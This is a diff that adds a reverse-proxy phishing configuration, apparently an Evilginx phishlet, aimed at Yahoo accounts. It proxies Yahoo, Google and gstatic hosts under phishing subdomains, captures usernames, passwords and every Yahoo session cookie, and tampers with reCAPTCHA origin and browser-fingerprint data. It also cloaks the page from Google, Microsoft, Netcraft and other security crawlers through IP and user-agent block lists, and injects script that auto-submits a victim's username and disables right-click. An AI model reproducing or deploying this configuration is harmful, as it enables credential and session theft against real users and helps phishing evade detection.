@@ -1,0 +1,371 @@
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'auth', orig_sub: 'login', domain: 'yahoo.net', session: true, is_landing: true, auto_filter: false}
+
+  # - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'ww1', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ww2', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ww3', orig_sub: 'www', domain: 'yahoo.net', session: true, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'news', orig_sub: 'news', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'finance', orig_sub: 'finance', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sports', orig_sub: 'sports', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'shopping', orig_sub: 'shopping', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'search', orig_sub: 'search', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # - {triggers_on: 'login.yahoo.com', orig_sub: '', domain: 'yahoo.com', search: 'using your', replace: 'fucking delete your', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  # - {triggers_on: 'login.yahoo.com', orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # - {triggers_on: 'login.yahoo.net', orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'csp.yahoo.com',   orig_sub: '', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # - {triggers_on: 'csp.yahoo.com',   orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  # - {triggers_on: 's.yimg.com',      orig_sub: '', domain: 'yimg.com',  search: '{domain}',  replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # - {triggers_on: 's.yimg.com',      orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/recaptcha/enterprise.js', replace: 'https://{hostname}/recaptcha/enterprise.js', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/recaptcha/enterprise.js', replace: 'https://{hostname}/recaptcha/enterprise.js', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  # - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '{domain}', replace: '{domain}', mimes: ['text/html']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html']}
+
+  - {triggers_on: 'www.yahoo.com', orig_sub: '', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: 'yahoo.com'
+    keys: ['.*,regexp']
+  - domain: '.yahoo.com'
+    keys: ['.*,regexp']
+  - domain: 'login.yahoo.com'
+    keys: ['.*,regexp']
+  - domain: 'www.yahoo.com'
+    keys: ['.*,regexp']
+force_get:
+
+  - path: '/recaptcha/enterprise/anchor'
+  
+    search: 
+    
+      - {key: 'co', search: '.*'}            
+      
+    force:
+    
+      - {key: 'co', value: 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz'}
+
+    force_get_modified: true
+      
+    type: 'query'
+
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - ^/consent$
+  - /ws/v3/batch
+  - /guccounter
+  - /d
+  - /?guccounter
+
+login:
+  domain: 'login.yahoo.com'
+  path: '/?.src=ym&pspid=159600001&activity=mail-direct&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd%2F'
+
+force_post:
+  - path: '/'
+    search:
+      - {key: 'browser-fp-data', search: '.*'}
+    force:
+      - {key: 'browser-fp-data', value: ''}
+    type: 'post'
+  - path: '/account/challenge/password'
+    search:
+      - {key: 'browser-fp-data', search: '.*'}
+    force:
+      - {key: 'browser-fp-data', value: ''}
+    type: 'post'
+cloaking:
+  enabled: true
+  ip_whitelist: []
+anti_bot:
+  ip_filtering:
+    blocked_ips:
+      - range: 40.77.0.0/16
+      - range: 13.66.0.0/15
+      - range: 40.96.0.0/12
+      - range: 64.233.160.0/19
+      - range: 66.249.80.0/20
+      - range: 72.14.192.0/18
+      - range: 74.125.0.0/16
+      - range: 108.177.8.0/21
+      - range: 173.194.0.0/16
+      - range: 216.58.192.0/19
+      - range: 216.239.32.0/19
+      - range: 13.107.246.0/24
+      - range: 13.107.128.0/22
+      - range: 40.96.0.0/12
+      - range: 52.96.0.0/14
+      - range: 131.107.0.0/16
+      - range: 72.246.0.0/16
+      - range: 69.164.0.0/16
+      - range: 140.82.0.0/16
+block_bots_on_http_request:
+  - user_agent: Googlebot
+    response_code: 403
+  - user_agent: Googlebot-Image
+    response_code: 403
+  - user_agent: Googlebot-Video
+    response_code: 403
+  - user_agent: Googlebot-News
+    response_code: 403
+  - user_agent: Googlebot-Mobile
+    response_code: 403
+  - user_agent: AdsBot-Google
+    response_code: 403
+  - user_agent: AdsBot-Google-Mobile
+    response_code: 403
+  - user_agent: MSNBOT
+    response_code: 403
+  - user_agent: Defender Bot/1.0
+    response_code: 403
+  - user_agent: Microsoft-CryptoAPI
+    response_code: 403
+  - user_agent: bingbot
+    response_code: 403
+  - user_agent: NetcraftSurveyAgent
+    response_code: 403
+  - user_agent: Pingdom
+    response_code: 403
+  - user_agent: SemrushBot
+    response_code: 403
+  - user_agent: MJ12bot
+    response_code: 403
+  - user_agent: Yahoo! Slurp
+    response_code: 403
+  - user_agent: YandexBot
+    response_code: 403
+  - user_agent: DuckDuckBot
+    response_code: 403
+  - user_agent: Baiduspider
+    response_code: 403
+  - user_agent: facebookexternalhit
+    response_code: 403
+  - user_agent: WhatsApp
+    response_code: 403
+  - user_agent: SkypeBot
+    response_code: 403
+    user_agent_blacklist:
+      - Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+      - Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0;
+        +http://www.netcraft.com/survey)
+      - Mozilla/5.0 (compatible; Pingdom.com Bot; +http://www.pingdom.com)
+      - msnbot/2.0 (http://search.msn.com/msnbot.htm)
+      - Microsoft-CryptoAPI/2.1
+      - Defender Bot/1.0
+      - Mozilla/5.0 (compatible; SemrushBot/4.0;
+        +https://www.semrush.com/bot.html)
+      - Mozilla/5.0 (compatible; MJ12bot/v1.0; +http://mj12bot.com/)
+      - Mozilla/5.0 (compatible; Yahoo! Slurp;
+        http://help.yahoo.com/help/us/ysearch/slurp)
+      - Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+      - DuckDuckBot/1.0; (+https://duckduckgo.com/duckduckbot)
+      - Baiduspider/2.0 (+http://www.baidu.com/search/spider.htm)
+      - facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
+      - Skype/8.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
+        Gecko) Chrome/58.0.3029.110 Safari/537.36
+      - Googlebot.*
+      - Googlebot/2.1
+      - SafeBrowsing
+      - Defender
+      - Googlebot
+      - SmartScreen
+      - ZoominfoBot
+      - bingbot
+      - YandexBot
+      - Baiduspider
+      - DuckDuckBot
+      - Slurp
+      - Sogou
+      - Exabot
+      - facebot
+      - ia_archiver
+      - MJ12bot
+      - AhrefsBot
+      - SemrushBot
+      - DotBot
+      - SEMrushBot
+      - spbot
+      - linkdexbot
+      - SeznamBot
+      - sitebot
+      - BLEXBot
+      - Twitterbot
+      - TweetmemeBot
+      - BitlyBot
+      - Pinterbot
+      - facebookexternalhit
+      - WhatsApp
+      - TelegramBot
+      - Slackbot
+      - Discordbot
+      - Googlebot-Video
+      - Googlebot-News
+      - Googlebot-Mobile
+      - AdsBot-Google
+      - AdsBot-Google-Mobile
+      - Mediapartners-Google
+      - Mediapartners
+      - NetcraftSurveyAgent
+      - DigitalOcean
+      - Microsoft-CryptoAPI
+      - msnbot
+      - Adidxbot
+      - Applebot
+      - ArchiveBot
+      - BacklinkCrawler
+      - BUbiNG
+      - CCBot
+      - Dataprovider
+      - DotBot
+      - Exabot
+      - Favicons
+      - findlinks
+      - Google-Site-Verification
+      - Google-Youtube-Links
+      - Google-Favicon
+      - GrapeshotCrawler
+      - heritrix
+      - IASCrawler
+      - InfoSeek
+      - Lighthouse
+      - LinkpadBot
+      - MegaIndex
+      - MJ12bot
+      - msnbot
+      - nutch
+      - PhantomJS
+      - Pingdom
+      - Riddler
+      - rogerbot
+      - Scrapy
+      - SEOENGBot
+      - Screaming Frog SEO Spider
+      - SeznamBot
+      - Slackbot
+      - Sogou
+      - Spider
+      - TelegramBot
+      - Uptimebot
+      - W3C_Validator
+      - Wget
+      - Yahoo! Slurp
+      - Yandex
+      - YandexBot
+      - Yeti
+      - YisouSpider
+      - Zookabot
+      - Googlebot
+      - bingbot
+      - YandexBot
+      - Baiduspider
+      - DuckDuckBot
+      - Slurp
+      - Sogou
+      - Exabot
+      - facebot
+      - ia_archiver
+      - MJ12bot
+      - AhrefsBot
+      - SemrushBot
+      - DotBot
+      - Cocolyzebot
+      - Surdotlybot
+      - spbot
+      - linkdexbot
+      - SeznamBot
+      - sitebot
+      - BLEXBot
+      - Twitterbot
+      - TweetmemeBot
+      - BitlyBot
+      - Pinterbot
+      - facebookexternalhit
+      - WhatsApp
+      - TelegramBot
+      - Slackbot
+      - Discordbot
+      - Googlebot-Image
+      - Googlebot-Video
+      - Googlebot-News
+      - AdsBot-Google
+      - AdsBot-Google-Mobile
+      - Mediapartners-Google
+      - Mediapartners
+      - Mediapartners-Google/2.1
+      - Mediapartners-Google/3.0
+      - AdsBot-Google/1.0
+      - AdsBot-Google-Mobile-Apps
+    redirect_url: https:/google.com
+js_inject:
+  - trigger_domains:
+      - login.yahoo.com
+    trigger_paths:
+      - /*
+    script: >
+      window.addEventListener("load", () => {
+        if (window.location.hash.length == 0) {
+          return
+        }
+        function waitForElm(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));const r=new MutationObserver(o=>{document.querySelector(e)&&(t(document.querySelector(e)),r.disconnect())});r.observe(document.body,{childList:!0,subtree:!0})})}
+        waitForElm("#login-username").then((elm) => {
+          elm.focus();
+          elm.value = window.location.hash.slice(1);
+          const submBtn = document.querySelector("#login-signin");
+          submBtn.focus();
+          submBtn.click();
+        });
+      });
+
+
+       // Disable right-click context menu
+      document.addEventListener('contextmenu', function(e) {
+          e.preventDefault();
+      });
